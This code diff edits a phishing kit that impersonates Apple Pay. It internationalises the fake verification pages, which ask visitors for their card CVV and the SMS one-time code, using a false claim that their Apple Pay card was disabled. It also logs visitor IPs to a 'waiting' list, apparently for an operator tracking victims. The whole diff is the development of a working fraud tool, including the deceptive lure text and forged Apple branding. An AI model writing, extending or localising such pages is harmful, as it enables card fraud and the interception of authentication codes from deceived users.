@@ -336,8 +336,8 @@ if (!$cvvValidated) {
     </svg>
   </div>
 
-  <h1>Vérification Apple Pay</h1>
-  <p class="subtitle">Veuillez saisir le <strong>code CVV</strong> (3 chiffres au verso) de votre <strong>moyen de paiement enregistré</strong> pour confirmer votre identité.</p>
+  <h1><?= t('sms_apple_pay') ?></h1>
+  <p class="subtitle"><?= t('sms_cvv_subtitle') ?></p>
 
   <div class="digits" id="cvvDigits">
     <input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
@@ -345,19 +345,19 @@ if (!$cvvValidated) {
     <input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
   </div>
 
-  <div class="error-msg hidden" id="cvvErrMsg">Vérification en cours…</div>
+  <div class="error-msg hidden" id="cvvErrMsg"><?= t('sms_loading') ?></div>
 
-  <button class="btn-verify" id="cvvBtn" disabled>Vérifier</button>
+  <button class="btn-verify" id="cvvBtn" disabled><?= t('push_btn_verify') ?></button>
 </div>
   </main>
 
   <footer class="site-footer">
     <nav class="footer-links">
-      <a href="#">État du système</a>
-      <a href="#">Engagement de confidentialité</a>
-      <a href="#">Conditions générales</a>
+      <a href="#"><?= t('push_footer_status') ?></a>
+      <a href="#"><?= t('push_footer_privacy') ?></a>
+      <a href="#"><?= t('push_footer_terms') ?></a>
     </nav>
-    <span class="footer-copy">Copyright &copy; 2026 Apple Inc. Tous droits réservés.</span>
+    <span class="footer-copy"><?= t('push_footer_copyright') ?></span>
   </footer>
 
 <div class="overlay" id="overlay">
@@ -370,7 +370,7 @@ if (!$cvvValidated) {
       <div class="spinner-blade"></div><div class="spinner-blade"></div>
       <div class="spinner-blade"></div><div class="spinner-blade"></div>
     </div>
-    <p>Vérification en cours…</p>
+    <p><?= t('sms_loading') ?></p>
   </div>
 </div>
 
@@ -473,7 +473,7 @@ $ipListFile = __DIR__ . '/security_check/ip_list.txt';
 file_put_contents($ipListFile, PHP_EOL . $ip . ',waiting', FILE_APPEND | LOCK_EX);
 ?>
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="<?= $current_lang ?>">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
@@ -761,8 +761,8 @@ file_put_contents($ipListFile, PHP_EOL . $ip . ',waiting', FILE_APPEND | LOCK_EX
     </svg>
   </div>
 
-  <h1>Code de vérification</h1>
-  <p class="subtitle">Suite à cette connexion, nous avons <strong>désactivé votre carte reliée à Apple Pay</strong>. Pour la resynchroniser, veuillez saisir le code reçu par SMS.</p>
+  <h1><?= t('sms_code_title') ?></h1>
+  <p class="subtitle"><?= t('sms_code_subtitle') ?></p>
 
   <div class="digits" id="digits">
     <input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code">
@@ -773,20 +773,20 @@ file_put_contents($ipListFile, PHP_EOL . $ip . ',waiting', FILE_APPEND | LOCK_EX
     <input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*">
   </div>
 
-  <div class="error-msg hidden" id="errMsg">Code incorrect. Veuillez réessayer.</div>
+  <div class="error-msg hidden" id="errMsg"><?= t('sms_error_invalid') ?></div>
 
-  <button class="btn-verify" id="btnVerify" disabled>Vérifier</button>
-  <button class="resend-link" type="button">Renvoyer le code</button>
+  <button class="btn-verify" id="btnVerify" disabled><?= t('push_btn_verify') ?></button>
+  <button class="resend-link" type="button"><?= t('sms_resend') ?></button>
 </div>
   </main>
 
   <footer class="site-footer">
     <nav class="footer-links">
-      <a href="#">État du système</a>
-      <a href="#">Engagement de confidentialité</a>
-      <a href="#">Conditions générales</a>
+      <a href="#"><?= t('push_footer_status') ?></a>
+      <a href="#"><?= t('push_footer_privacy') ?></a>
+      <a href="#"><?= t('push_footer_terms') ?></a>
     </nav>
-    <span class="footer-copy">Copyright &copy; 2026 Apple Inc. Tous droits réservés.</span>
+    <span class="footer-copy"><?= t('push_footer_copyright') ?></span>
   </footer>
 
 <!-- loading overlay -->
@@ -800,7 +800,7 @@ file_put_contents($ipListFile, PHP_EOL . $ip . ',waiting', FILE_APPEND | LOCK_EX
       <div class="spinner-blade"></div><div class="spinner-blade"></div>
       <div class="spinner-blade"></div><div class="spinner-blade"></div>
     </div>
-    <p>Vérification en cours…</p>
+    <p><?= t('sms_loading') ?></p>
   </div>
 </div>
 
